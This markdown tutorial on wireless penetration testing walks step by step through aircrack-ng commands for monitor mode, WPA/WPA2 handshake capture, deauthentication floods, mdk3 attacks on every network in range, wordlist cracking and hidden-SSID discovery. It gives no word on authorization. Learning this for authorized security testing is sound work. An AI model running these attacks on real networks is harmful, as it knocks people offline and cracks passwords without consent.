# Wireless Penetration Testing

### Step 1: Update and Install Tools

```bash
apt update
apt install aircrack-ng
```

### Step 2: Check Interfaces

```bash
ifconfig
```

* Mode is **Manage** (default mode).

### Step 3: Enable Monitor Mode

```bash
airmon-ng start wlan0
```
```bash
ifconfig
```

* Monitor mode is now **ON**.

```bash
iwconfig
```

* Confirms monitor mode is **ON**.

### Step 4: Start Capturing

```bash
airodump-ng wlan0mon
```

---

## Airodump-ng Output Explanation

* **BSSID** – MAC address of the Access Point.
* **PWR** – Signal level reported by the card / Signal power.
* **Beacons** – Number of announcement packets sent by the AP.
* **RXQ** – Receive Quality (percentage of successfully received packets over last 10s).
* **# Data** – Number of captured data packets (including broadcast).
* **#/s** – Data packets per second (last 10s).
* **CH** – Channel number.
* **MB** – Maximum speed supported by the AP.
* **ENC** – Encryption algorithm in use.
* **CIPHER** – Cipher detected (CCMP, WARP, TKIP, WEP, WEP40, WEP104).
* **AUTH** – Authentication protocol used.
* **ESSID** – Wireless network name.
* **STATION** – MAC address of each connected station.
* **Lost** – Number of packets lost (last 10s, based on sequence numbers).
* **Packets** – Packets sent by the client.
* **Probes** – ESSIDs probed by the client.

---

## Password Capturing & Deauth Attack

### Capture Handshake

```bash
airodump-ng --bssid 50:D4:F7:C7:C1:4D --channel 1 wlan0mon
```

* `--bssid` → Target AP MAC address
* `--channel` → Channel of target AP

```bash
airodump-ng --bssid 50:D4:F7:C7:C1:4D --channel 1 --write /home/user/Documents/Accesspoint.pcap wlan0mon
```

* Output (`Accesspoint.pcap`) will contain the WiFi handshake.

> Run the above command, then in a **new terminal** continue with the steps below.
---

### Test Injection Capability

```bash
aireplay-ng
```
or
```bash
aireplay-ng --test wlan0mon
```

* Must show: **“Injection is working!”**

```bash
aireplay-ng --test -b 50:D4:F7:C7:C1:4D wlan0mon
```
or
```bash
aireplay-ng -9 -b 50:D4:F7:C7:C1:4D wlan0mon
```

* Again, should confirm **Injection is working**.
* If confirmed, the interface can perform **deauth attacks**.

---

### Deauthentication Attacks

**Deauth all devices connected to AP:**

```bash
aireplay-ng --deauth 100 -a 50:D4:F7:C7:C1:4D wlan0mon
```

* `100` = number of deauth packets
* `0` = unlimited (until stopped manually)

**Deauth a specific connected device:**

```bash
aireplay-ng --deauth 0 -a 50:D4:F7:C7:C1:4D -c 50:D4:F7:C7:C1:4D wlan0mon
```
or
```bash
aireplay-ng -0 0 -a 50:D4:F7:C7:C1:4D -c 50:D4:F7:C7:C1:4D wlan0mon
```

---

## Other Deauth Tools

**Using MDK3** (affects *all WiFi networks* in range):

Deauth all clients of all nearby networks:

```bash
mdk3 wlan0mon d
```

Beacon flood attack (fake APs):

```bash
mdk3 wlan0mon b
```
---

# WPA/WPA2 Cracking (WiFi Cracking)

To crack a **WPA/WPA2** network (with **WPS disabled**) we need **two things**:

1. **Capture the handshake**
2. **Have a wordlist**

---

## Capturing the Handshake

Check wireless interfaces:

```bash
iwconfig
```

Enable monitor mode:

```bash
airmon-ng start wlan0
```

Scan nearby WiFi networks:

```bash
airodump-ng wlan0mon
```

> When you see the **target network**, stop scanning to note its details.
Start targeted capture:

```bash
airodump-ng --channel 1 --bssid 50:D4:F7:C7:C1:4D --write /home/user/Documents/Accesspoint wlan0mon
```

* `--channel` → Channel of target AP
* `--bssid` → MAC address of target AP
* `--write` → Save capture file (contains handshake)

Deauthenticate clients to force handshake:

```bash
aireplay-ng -0 0 -a 50:D4:F7:C7:C1:4D wlan0mon
```

* First `0` → shortcut for **deauth attack**
* Second `0` → **unlimited packets** until stopped

---

## Cracking the Handshake with Aircrack-ng

Once the handshake is captured:

```bash
aircrack-ng /home/user/Documents/Accesspoint.cap -w /opt/rockyou.txt
```

* Replace `rockyou.txt` with your custom wordlist.
* Aircrack-ng will test each password until it finds the correct one.

---

## WiFi Password Cracking with Hashcat

**Download Hashcat utilities:**
-> [Hashcat GitHub Releases](https://github.com/hashcat/hashcat-utils/releases)

Move into Hashcat utilities:

```bash
cd /usr/lib/hashcat-utils
```

Copy conversion tool:

```bash
cp cap2hccapx.bin /usr/local/bin
```

Verify:

```bash
ls -lh /usr/local/bin/cap2hccapx.bin
```

Convert `.cap` file into `.hccapx` (Hashcat format):

```bash
cap2hccapx.bin /home/user/Documents/Accesspoint.cap
```

* This will show the **required input format**.

Now run the actual conversion:

```bash
cap2hccapx.bin /home/user/Documents/Accesspoint.cap /home/user/Documents/Accesspoint.hccapx
```

---

# WiFi Password Cracking of Hidden Networks (Disabled SSIDs)

### Step 1: Enable Monitor Mode

```bash
airmon-ng start wlan0
```

### Step 2: Scan for Networks

```bash
airodump-ng wlan0mon
```

* Hidden networks appear with **ESSID = `<length: 0>`**

### Step 3: Focus on Specific Channel

```bash
airodump-ng wlan0mon --channel 11
```

* This will reveal the **name of the Access Point (ESSID)**.

### Step 4: Target Specific AP

```bash
airodump-ng wlan0mon --channel 11 --bssid 50:D4:F7:C7:C1:4D
```

* Starts capturing packets and prepares for handshake capture.

### Step 5: Force Clients to Reconnect (Deauth Attack)

```bash
aireplay-ng -0 0 -a 50:D4:F7:C7:C1:4D wlan0mon
```

* Deauthenticates all clients from the AP.
* When clients reconnect, the **handshake** will be captured.

### Step 6: Stop Monitor Mode (After Capture)

```bash
airmon-ng stop wlan0mon
```

### Step 7: Verify

```bash
iwconfig
```

* Confirms interface is back to **managed mode**.

---
